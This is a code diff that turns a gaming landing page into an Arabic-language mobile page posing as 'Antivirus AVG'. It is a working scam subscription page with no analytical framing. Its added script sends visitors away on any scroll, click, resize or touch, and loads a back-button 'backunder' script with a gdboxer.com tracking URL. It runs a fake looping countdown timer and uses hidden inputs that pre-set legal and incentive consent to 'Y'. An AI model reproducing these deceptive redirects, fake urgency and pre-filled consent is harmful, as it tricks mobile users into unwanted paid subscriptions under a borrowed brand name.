@@ -1,123 +1,748 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.2//EN">
+<html xmlns="http://www.w3.org/1999/xhtml">
 
 <head>
-    <meta charset="UTF-8">
+    <base href="">
+
+    <base href="">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GAMER CLUB</title>
-    <link rel="stylesheet" href="css/style.css">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <script async="" src="jquery.min.js"></script>
+    <script>
+        function redirect(e) {
+            e.preventDefault();
+            location.href = '#js-landing-url';
+        }
+        document.addEventListener('DOMContentLoaded', function () {
+            window.addEventListener('scroll', redirect);
+            window.addEventListener('resize', redirect);
+            document.addEventListener('click', redirect);
+            document.addEventListener('touchstart', redirect);
+        });
+
+    </script>
+
     <script>
         var under = 'https://gdboxer.com/cc0kl7k.php?key=hif1bzaxayvttv3p19q7&visitor_id=${SUBID}&cost={cost}&zoneid={zoneid}&campaignid={campaignid}&survey_exit_type={survey_exit_type}&browser={browser}&subzone_id={subzone_id}&osversion={osversion}&bannerid={bannerid}&language={language}&isp={isp}&user_activity={user_activity}';
-      </script>
-      <script src="backunder.js"></script>
+    </script>
+    <script src="backunder.js"></script>
+
+    <style>
+        .operator-group {
+            display: block;
+            position: relative;
+            overflow: hidden;
+            background: #fff;
+            border: 1px solid #666;
+            border-radius: 3px;
+            -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.5);
+            width: 220px;
+            margin: 10px auto;
+        }
+
+        .operator-group:before,
+        .operator-group:after {
+            content: '';
+            position: absolute;
+            z-index: 2;
+            top: 9px;
+            right: 10px;
+            width: 0;
+            height: 0;
+            border: 4px dashed;
+            border-color: #888 transparent;
+            pointer-events: none;
+        }
+
+        .operator-group:before {
+            border-bottom-style: solid;
+            border-top: none;
+        }
+
+        .operator-group:after {
+            margin-top: 7px;
+            border-top-style: solid;
+            border-bottom: none;
+        }
+
+        .operator-selection {
+            position: relative;
+            width: 130%;
+            margin: 0;
+            height: 30px;
+            padding: 5px 10px;
+            font-size: 15px;
+            color: #333;
+            background: #f2f2f2;
+            background: rgba(0, 0, 0, 0) !important;
+            border: 0;
+            border-radius: 0;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+        }
+
+        .operator-selection:focus {
+            z-index: 3;
+            width: 100%;
+            color: #394349;
+            outline: 2px solid #ccc;
+            outline-offset: -2px;
+        }
+
+        .operator-selection>option {
+            margin: 3px;
+            padding: 6px 8px;
+            text-shadow: none;
+            background: #f2f2f2;
+            border-radius: 3px;
+            -webkit-border-radius: 3px;
+            cursor: pointer;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            -ms-appearance: none;
+            -o-appearance: none;
+            appearance: none;
+        }
+
+
+
+        /* ----------------- IE 8 customized css for height:auto --------------------*/
+
+        @media \0screen {
+            .imgIE8 {
+                width: auto;
+                /* for ie 8 */
+            }
+        }
+
+        /* ----------------- IMG 100% ------------------*/
+
+        .img100pct {
+            width: 100%;
+        }
+
+        /* ----------------- OC2SMS Button remove underline ------------------*/
+
+        a {
+            text-decoration: none;
+        }
+    </style>
+    <style>
+        #confirmation-legal-wrapper,
+        #confirmation-incentivized-wrapper,
+        .confirmation-op_confirm-wrapper {
+            position: absolute;
+            z-index: 1000;
+            width: 100%;
+            height: 100%;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.6);
+        }
+
+        .bupper-popup-block {
+            display: table;
+            width: 50%;
+            margin: 18% auto;
+            min-height: 100px;
+            background-color: #eee;
+            border-radius: 10px;
+            border: 10px rgba(255, 255, 255, 1) solid;
+            /*padding:20px;position:absolute;margin-left:30%;margin-right:30%; top:30%;*/
+            color: rgba(0, 0, 0, 1);
+        }
+
+        .accept-confirmation,
+        .decline-confirmation {
+            border-radius: 5px;
+            border: none;
+            background-color: rgba(0, 153, 204, 1);
+            color: rgba(255, 255, 255, 1);
+            padding: 5px;
+            margin: 3px;
+        }
+
+        .accept-confirmation:hover,
+        .decline-confirmation:hover {
+            border-radius: 5px;
+            border: none;
+            background-color: rgba(0, 128, 192, 1);
+            color: rgba(255, 255, 255, 1);
+            padding: 5px;
+        }
+
+        @media screen and (max-width: 780px) {
+            .bupper-popup-block {
+                margin: 33% auto;
+                /*min-height:100px;left:20%;right:20%;position:absolute;top:25%;*/
+                background-color: #eee;
+                border-radius: 10px;
+                /*padding:20px;*/
+            }
+        }
+
+        @media screen and (max-width: 480px) {
+            .bupper-popup-block {
+                width: 70%;
+                margin: 40% auto;
+                /*min-height:100px;left:5%;right:5%;position:absolute;top:30%;*/
+                background-color: #eee;
+                border-radius: 10px;
+                /*padding:20px;*/
+            }
+        }
+    </style>
+    <style>
+        /* ---------------------------- top hooks and bottom hooks layout styling ------------------------------ */
+
+        .footer,
+        .toplegal {
+            font-size: 11px;
+            text-align: justify;
+            display: table;
+            width: 100%;
+        }
+
+        .toplegal p {
+            margin: 0;
+        }
+
+        .popup-bottom,
+        .popup-top {
+            display: table-row;
+        }
+
+        .hook-confirmationBodyStart,
+        hook-confirmationBodyEnd {
+            padding: 5px;
+            text-align: center;
+        }
+
+        .hook-confirmationBodyStart {
+            margin-top: 10px;
+        }
+
+        .hook-confirmationBodyEnd {
+            margin-bottom: 10px;
+        }
+
+        .hook-topLeft,
+        .hook-topCenter,
+        .hook-topRight {
+            margin: 0;
+            top: 0;
+        }
+
+        .hook-confirmationTopLeft,
+        .hook-confirmationTopCenter,
+        .hook-confirmationTopRight {
+            margin: 0;
+        }
+
+        .hook-topLeft,
+        .hook-bottomLeft,
+        .hook-confirmationTopLeft,
+        .hook-confirmationBottomLeft {
+            text-align: left;
+        }
+
+        .hook-topCenter,
+        .hook-bottomCenter {
+            text-align: justify;
+        }
+
+        .hook-topRight,
+        .hook-bottomRight,
+        .hook-confirmationTopRight,
+        .hook-confirmationBottomRight {
+            text-align: right;
+        }
+
+        .hook-confirmationTopCenter,
+        .hook-confirmationBottomCenter {
+            text-align: center;
+        }
+
+        .hook-bottomLeft,
+        .hook-bottomCenter,
+        .hook-bottomRight,
+        .hook-topLeft,
+        .hook-topCenter,
+        .hook-topRight {
+            display: table-cell;
+            padding: 5px;
+            vertical-align: top;
+        }
+
+        .hook-confirmationTopLeft,
+        .hook-confirmationTopCenter,
+        .hook-confirmationTopRight,
+        .hook-confirmationBottomLeft,
+        .hook-confirmationBottomCenter,
+        .hook-confirmationBottomRight {
+            display: table-cell;
+            padding: 5px;
+        }
+
+
+        /* ---------------------------- end top hooks and bottom hooks layout styling ------------------------------ */
+    </style>
+    <style>
+        html {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            text-align: center;
+            font-size: 1em;
+            background: rgba(27, 39, 63, 1);
+            background: -moz-linear-gradient(top, rgba(27, 39, 63, 1) 0%, rgba(27, 39, 63, 1) 10%, rgba(29, 68, 65, 1) 80%, rgba(24, 43, 42, 1) 90%, rgba(18, 18, 18, 1) 100%);
+            background: -webkit-gradient(left top, left bottom, color-stop(0%, rgba(27, 39, 63, 1)), color-stop(10%, rgba(27, 39, 63, 1)), color-stop(80%, rgba(29, 68, 65, 1)), color-stop(90%, rgba(24, 43, 42, 1)), color-stop(100%, rgba(18, 18, 18, 1)));
+            background: -webkit-linear-gradient(top, rgba(27, 39, 63, 1) 0%, rgba(27, 39, 63, 1) 10%, rgba(29, 68, 65, 1) 80%, rgba(24, 43, 42, 1) 90%, rgba(18, 18, 18, 1) 100%);
+            background: -o-linear-gradient(top, rgba(27, 39, 63, 1) 0%, rgba(27, 39, 63, 1) 10%, rgba(29, 68, 65, 1) 80%, rgba(24, 43, 42, 1) 90%, rgba(18, 18, 18, 1) 100%);
+            background: -ms-linear-gradient(top, rgba(27, 39, 63, 1) 0%, rgba(27, 39, 63, 1) 10%, rgba(29, 68, 65, 1) 80%, rgba(24, 43, 42, 1) 90%, rgba(18, 18, 18, 1) 100%);
+            background: linear-gradient(to bottom, rgba(27, 39, 63, 1) 0%, rgba(27, 39, 63, 1) 10%, rgba(29, 68, 65, 1) 80%, rgba(24, 43, 42, 1) 90%, rgba(18, 18, 18, 1) 100%);
+            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#1b273f', endColorstr='#121212', GradientType=0);
+            background-size: 100% 100%;
+            min-height: 100%;
+
+        }
+
+
+        div {
+            margin: 0 auto;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            min-height: 500px;
+            color: #fff;
+        }
+
+        .main_img {
+            width: 100%;
+        }
+
+        .ctabox {
+            width: 85%;
+            border-radius: 10px;
+            -moz-border-radius: 3px;
+            -webkit-border-radius: 3px;
+        }
+
+        .msisdn-input,
+        .pin-input {
+            padding: 8px;
+            font-size: 1.5em;
+            font-weight: bold;
+            border-radius: 3px;
+            box-shadow: inset 1px 1px 6px 0 rgba(133, 133, 133, 1);
+            margin: 10px auto;
+            border: 4px solid rgba(255, 0, 0, 0);
+
+        }
+
+        .submit-button {
+            animation: border .6s running infinite;
+            -webkit-animation: border .6s running infinite;
+        }
+
+        .msisdn-submit-button,
+        .pin-submit-button,
+        .msisdn-submit-disable,
+        .pin-submit-disable,
+        .btn-disable,
+        .btn,
+        .operator-logo,
+        .oc2sms-button,
+        .btn1 {
+            border: none;
+            -webkit-border-radius: 25px;
+            -moz-border-radius: 25px;
+            border-radius: 25px;
+            font-size: 1.5em;
+            font-family: Arial, Helvetica, sans-serif;
+            padding: 8px;
+            text-decoration: none;
+            display: inline-block;
+            text-shadow: -1px -1px 0 rgba(0, 0, 0, 0.3);
+            font-weight: bold;
+            color: #FFFFFF;
+            width: 63%;
+            margin-top: 15px;
+            background: #239a48;
+            margin: 15px auto;
+            cursor: pointer;
+        }
+
+        .btn1 {
+            padding: 20px;
+            font-size: 2.5em;
+            width: 80%;
+        }
+
+        .operator-logo {
+            display: block;
+            margin: 5px auto;
+            max-width: 150px;
+        }
+
+        .txt_black_20 {
+            font-size: 22px;
+            font-weight: bold;
+        }
+
+        input:focus {
+            outline: none;
+        }
+
+        .valid .msisdn-input,
+        .msisdn-input:hover,
+        .pin-input:hover {
+            animation: none;
+            -webkit-animation: none;
+        }
+
+
+        .TQ_txt {
+            font-size: 1.8em;
+            color: #57d229;
+            font-weight: bold;
+            animation: keyword 0.5s infinite;
+            -webkit-animation: keyword 0.5s infinite;
+        }
+
+        .timer {
+            font-size: .7rem;
+            background-color: rgba(0, 0, 0, .5);
+            border-radius: 8px;
+            -webkit-border-radius: 8px;
+            -moz-border-radius: 8px;
+            width: 180px;
+            margin: 0 auto 5px;
+            padding: 3px;
+        }
+
+        #time {
+            font-size: 1.7rem;
+            color: #6C0;
+        }
+
+        @keyframes keyword {
+            0% {
+                color: #57d229;
+            }
+
+            50% {
+                color: #dafcbd;
+            }
+
+            100% {
+                color: #57d229;
+            }
+        }
+
+        @-webkit-keyframes keyword {
+            0% {
+                color: #57d229;
+            }
+
+            50% {
+                color: #dafcbd;
+            }
+
+            100% {
+                color: #57d229;
+            }
+        }
+
+        @keyframes border {
+            0% {
+                border: 4px solid rgba(242, 242, 242, 0);
+            }
+
+            70% {
+                border: 4px solid rgba(242, 242, 242, 1);
+                box-shadow: 0 0 3px 1px rgba(40%, 40%, 40%, 1);
+            }
+
+            100% {
+                border: 4px solid rgba(242, 242, 242, 0);
+            }
+        }
+
+        @-webkit-keyframes border {
+            0% {
+                border: 4px solid rgba(242, 242, 242, 0);
+            }
+
+            70% {
+                border: 4px solid rgba(242, 242, 242, 1);
+                box-shadow: 0 0 3px 1px rgba(40%, 40%, 40%, 1);
+            }
+
+            100% {
+                border: 4px solid rgba(242, 242, 242, 0);
+            }
+        }
+
+        .footer {
+            font-size: 12px;
+            margin-top: 30px;
+        }
+
+        a {
+            text-decoration: underline;
+        }
+
+        .tq_txt2 {
+            font-size: 1.0em;
+        }
+
+        h1 {
+            font-size: 2em;
+        }
+
+        h2 {
+            font-size: 1.5em;
+            margin: 0;
+        }
+
+        h3 {
+            font-weight: normal;
+            font-size: 1em;
+            padding: 0 15px;
+        }
+
+        h3 a {
+            color: #FF0;
+        }
+
+        .hook-dynamic,
+        .component-msg {
+            display: inline;
+        }
+
+        h4 {
+            font-size: 1.2em;
+        }
+
+        .tq_cta {
+            font-size: 1.3em;
+            padding: 5px;
+        }
+
+        .android_text {
+            font-size: 11px;
+        }
+
+        p {
+            padding: 0;
+            margin: 0;
+        }
+
+        .msisdn-group:before,
+        .pin-group:before,
+        #pinwrap:before {
+            content: url("arrow3red.gif");
+            margin-left: -50px;
+            vertical-align: middle;
+            display: inline-block;
+        }
+
+        .valid:before {
+            display: none;
+        }
+
+
+        /* iPhone-specific styles */
+        @media only screen and (max-device-width: 480px) {
+
+            html {
+                -webkit-text-size-adjust: none;
+            }
+        }
+
+
+        /* ---------------------------- top hooks and bottom hooks layout styling ------------------------------ */
+
+        .footer,
+        .toplegal {
+            font-size: 11px;
+            display: table;
+            width: 99%;
+        }
+
+        .hook-topLeft,
+        .hook-topCenter,
+        .hook-topRight {
+            margin: 0;
+            top: 0;
+            padding: 5px;
+            font-size: 11px;
+            color: #fff;
+            display: table-cell;
+        }
+
+        .hook-topLeft,
+        .hook-bottomLeft {
+            text-align: left;
+        }
+
+        .hook-topCenter,
+        .hook-bottomCenter {
+            text-align: justify;
+        }
+
+        .hook-topRight,
+        .hook-bottomRight {
+            text-align: right;
+        }
+
+        .hook-bottomLeft,
+        .hook-bottomCenter,
+        .hook-bottomRight {
+            font-size: 11px;
+            display: table-cell;
+            padding: 5px;
+        }
+
+
+        /* ---------------------------- end top hooks and bottom hooks layout styling ------------------------------ */
+    </style>
+    <title>Antivirus AVG</title>
+
+
+
 </head>
 
 <body>
-    <div class="wrapper">
-        <div class="main">
-            <div class="main__inner">
-                <div class="main__img">
-                    <!-- <img src="img/main.png" alt=""> -->
+
+    <input type="hidden" id="gaclientid" name="gaclientid" value="">
+
+    <div class="container">
+        <div class="toplegal">
+        </div>
+
+        <div class="container">
+            <div>
+                <!-- <img src="maintitle.png" alt="download antivirus avg" class="main_img"> -->
+                <img src="main.png" alt="download antivirus avg" class="main_img">
+            </div>
+
+            <div class="timer">
+                <span class="timtxt">الوقت المتبقي:</span>
+                <span id="time">00:17</span>
+                <!-- <span class="timtxt">الوقت المتبقي</span> -->
+            </div>
+            <div class="ctabox">
+
+
+
+
+
+
+                <div class="hook-block hook-beforeInput"><span class="msisdnErrMsg errMsg" id="msisdnErrMsg"></span>
+                    <span class="msisdnErrMsg errMsg"></span>
+                    <span class="operatorErrMsg errMsg" id="operatorErrMsg"></span>
                 </div>
-                <div class="main__box">
-                    <h1 class="main__title">GAMER CLUB
-                        <span>Our</span> Marketplace
-                    </h1>
-                    <div class="main__text">انقر للاشتراك للحصول على حزمة هدية,اليوم الأخير!</div>
-                    <div class="button">
-                        <a href="https://gdboxer.com/cc0kl7k.php?lp=1" class="btn">اشترك الآن</a>
+
+
+                <div class="hook-block hook-beforeSubmit">
+                    <input type="hidden" name="legalCheckbox" value="Y">
+
+                    <input type="hidden" name="incentivizedCheckbox" value="Y">
+                </div> 
+                <a href="https://gdboxer.com/cc0kl7k.php?lp=1" id="msisdn-submit-button" class="submit-button msisdn-submit-disable"
+                    value="proceed" disabled="disabled"> اشترك الآن
+                </a>
+            </div>
+            <br>
+
+            <img src="android.png" alt="android only" width="10%"><br>
+            <div class="android_text">للاندرويد فقط</div><br>
+
+            <div class="footer">
+                <div class="hook-block hook-bottomCenter">
+
+
+                    <!-- <a class="component-link" id="component-link-DISCLAIMER" href="#landing-url" target="_blank"
+                        data-type="toggle">
+                        <div style="text-align: center;"><span style="color:#FFFFFF;"><span
+                                    style="font-size: 12px;">T&amp;C</span></span></div>
+                    </a> -->
+
+                    <div class="component-msg" id="component-msg-DISCLAIMER" style="display: none;">
+                        <div id="component-content-DISCLAIMER" class="component-content-DISCLAIMER-wrapper">
+
+
+                            <p style="text-align: center;">&nbsp;</p>
+                        </div>
                     </div>
+
+
+
+                    <!-- <div class="component-msg" id="component-msg-FAQ">
+                        <div style="text-align: center;"><span style="font-size:12px;"><a href="#landing-url"
+                                    target="_blank"><span style="color:#FFFFFF;">FAQ</span></a></span>
+                                </div>
+                    </div> -->
                 </div>
             </div>
         </div>
-        <!-- <div class="dop">
-            <div class="dop__container">
-                <div class="dop__title">You can choose one of these models</div>
 
-                <div class="dop__inner">
-                    <div class="dop__box">
-                        <a href="#landing-url" class="dop__link">
-                            <img src="img/iphone01.png" alt="" class="dop__img">
-                            <div class="dio__button">
-                                <img src="img/color01.png" alt="">
-                            </div>
-                        </a>
+        <div class="op_confirm-checkbox op_confirm-checkbox-wrap">
 
-                    </div>
-                    <div class="dop__box">
-                        <a href="#landing-url" class="dop__link">
-                            <img src="img/iphone02.png" alt="" class="dop__img">
-                            <div class="dio__button">
-                                <img src="img/color02.png" alt="">
-                            </div>
-                        </a>
+            <input type="hidden" name="op_confirmCheckbox" value="N">
+            <input type="checkbox" id="op_confirm-checkbox" class="op_confirm-checkbox" name="op_confirmCheckbox"
+                value="Y" style="display: none;">
 
+            <div id="confirmation-op_confirm-wrapper" class="confirmation-op_confirm-wrapper bupper-popup-div"
+                style="display: none; position: absolute; left: 0; top: 0;">
+                <div class="bupper-popup-block">
+                    <div class="hook-block hook-confirmationBodyStart">
+                        <div class="confirmation-text" id="confirmation-text-op_confirm">OP_CONFIRM_PAGE_TEXT</div>
                     </div>
-                    <div class="dop__box">
-                        <a href="#landing-url" class="dop__link">
-                            <img src="img/iphone03.png" alt="" class="dop__img">
-                            <div class="dio__button">
-                                <img src="img/color03.png" alt="">
-                            </div>
-                        </a>
-
-                    </div>
-                    <div class="dop__box">
-                        <a href="#landing-url class=" dop__link">
-                            <img src="img/iphone04.png" alt="" class="dop__img">
-                            <div class="dio__button">
-                                <img src="img/color04.png" alt="">
-                            </div>
-                        </a>
-
-                    </div>
-                </div>
-                <div class="dop__title">Reviews</div>
-                <div class="reviews">
-                    <div class="rewiews__inner">
-                        <div class="rewiews__box">
-                            <img src="img/rewiews01.jpg" alt="" class="rewiews__img">
-                            <div class="rewiews__rew">
-                                <div class="rewiews__name">Sam</div>
-                                <div class="rewiews__text">Wow! I decided to try to guess the result and it turned out
-                                </div>
-                            </div>
-                        </div>
-                        <div class="rewiews__box">
-                            <img src="img/rewiews02.jpg" alt="" class="rewiews__img">
-                            <div class="rewiews__rew">
-                                <div class="rewiews__name">Кate</div>
-                                <div class="rewiews__text">At first I did believed that it was a scamming but I’ve got
-                                    it.
-                                    Just try it!</div>
-                            </div>
-                        </div>
-                        <div class="rewiews__box">
-                            <img src="img/rewiews03.jpg" alt="" class="rewiews__img">
-                            <div class="rewiews__rew">
-                                <div class="rewiews__name">Alice</div>
-                                <div class="rewiews__text">I’ve had old iPhone 7 and finally upgraded. Decided to get
-                                    pink.
-                                </div>
-                            </div>
-                        </div>
-                        <div class="rewiews__box">
-                            <img src="img/rewiews04.jpg" alt="" class="rewiews__img">
-                            <div class="rewiews__rew">
-                                <div class="rewiews__name">Mike</div>
-                                <div class="rewiews__text">Finally after 5 ATTEMPTS I’ve won it
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div> -->
-                <!-- <div class="button reviews__btn">
-                    <a href="https://bilibili.com" class="btn">Get it now</a>
+                    <div class="hook-block hook-confirmationBodyEnd"></div>
                 </div>
             </div>
+
+
+
         </div>
-    </div> --> -->
+
+    </div>
+
+    <script>var _initialJqueryTime = new Date();</script>
+    <script src="jquery.min.js"></script>
+
+    <script>
+        function startTimer(duration, display) {
+            var timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10)
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    timer = duration;
+                }
+            }, 1000);
+        }
+
+        window.onload = function () {
+            var fiveMinutes = 30;
+            var display = document.querySelector('#time');
+            startTimer(fiveMinutes, display);
+        };
+    </script>
+    </div>
+
 </body>
 
 </html>
